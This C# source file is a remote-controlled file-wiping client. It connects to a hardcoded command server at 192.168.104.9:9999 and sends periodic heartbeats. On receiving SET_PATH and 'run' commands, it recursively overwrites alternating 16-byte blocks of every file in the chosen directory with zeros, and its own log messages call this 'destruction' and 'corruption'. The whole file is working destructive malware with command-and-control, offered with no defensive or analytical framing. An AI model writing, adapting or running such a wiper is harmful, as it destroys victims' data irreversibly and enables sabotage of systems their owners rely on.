using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace ClientApp
{
    class FileCorruptionClient
    {
        static int totalFilesProcessed = 0;
        static string directoryPath = "";  

        public static async Task ConnectToServerAndReceiveCommandsAsync(string serverIP, int serverPort)
        {
            CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
            try
            {
                using (var client = new TcpClient())
                {
                    await client.ConnectAsync(serverIP, serverPort);
                    Console.WriteLine("Connected to server.");

                    using (var stream = client.GetStream())
                    using (var writer = new StreamWriter(stream, leaveOpen: true) { AutoFlush = true })
                    using (var reader = new StreamReader(stream))
                    {
                        var heartbeatTask = SendHeartbeatAsync(writer, cancellationTokenSource.Token);

                        while (true)
                        {
                            string serverResponse = await reader.ReadLineAsync();
                            if (serverResponse == null) break;
                            Console.WriteLine(serverResponse);

                            ProcessServerCommand(serverResponse);
                        }

                        cancellationTokenSource.Cancel();
                    }
                    Console.WriteLine("Server connection closed.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            finally
            {
                cancellationTokenSource.Dispose();
            }
        }

        static void ProcessServerCommand(string command)
        {
            Console.WriteLine($"Processing command: {command}");  // Log the command for debugging

            if (command.StartsWith("SET_PATH "))
            {
                directoryPath = command.Substring(9).Trim();
                if (directoryPath.StartsWith("\"") && directoryPath.EndsWith("\"") && directoryPath.Length > 1)
                {
                    directoryPath = directoryPath.Substring(1, directoryPath.Length - 2); 
                }

                Console.WriteLine($"Directory path set to: {directoryPath}");
            }
            else if (command.Equals("run") && !string.IsNullOrEmpty(directoryPath))
            {
                if (Directory.Exists(directoryPath))
                {
                    Console.WriteLine($"Running destruction on {directoryPath}");
                    var corruptionTask = Task.Run(() => Corruption(directoryPath));
                    corruptionTask.Wait(); 
                }
                else
                {
                    Console.WriteLine("The provided directory does not exist.");
                }
            }
        }


        static async Task SendHeartbeatAsync(StreamWriter writer, CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                await writer.WriteLineAsync("heartbeat");
                Console.WriteLine($"Heartbeat sent at {DateTime.UtcNow}");
                await Task.Delay(50000, cancellationToken);
            }
        }

        static async Task Corruption(string directoryPath)
        {
            Console.WriteLine("Initiating corruption process...");

            try
            {
                string[] files = Directory.GetFiles(directoryPath, "*.*", SearchOption.AllDirectories);
                Console.WriteLine($"Total files found: {files.Length}");

                int filesProcessed = 0;
                foreach (var file in files)
                {
                    try
                    {
                        using (FileStream stream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite))
                        {
                            byte[] zeroBuffer = new byte[16];
                            long position = 0;

                            while (position < stream.Length)
                            {
                                int bytesToWrite = (position + 16 <= stream.Length) ? 16 : (int)(stream.Length - position);
                                stream.Position = position;
                                stream.Write(zeroBuffer, 0, bytesToWrite);
                                position += 32;  // Move position ahead to ensure progress
                            }
                        }
                        filesProcessed++;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Failed to corrupt file {file}: {ex.Message}");
                    }
                }

                Console.WriteLine($"Corruption process completed. Files processed: {filesProcessed}/{files.Length}.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to retrieve files: {ex.Message}");
            }
        }



        // Set the server info here.
        static async Task Main(string[] args)
        {
            await ConnectToServerAndReceiveCommandsAsync("192.168.104.9", 9999);
        }
    }
}
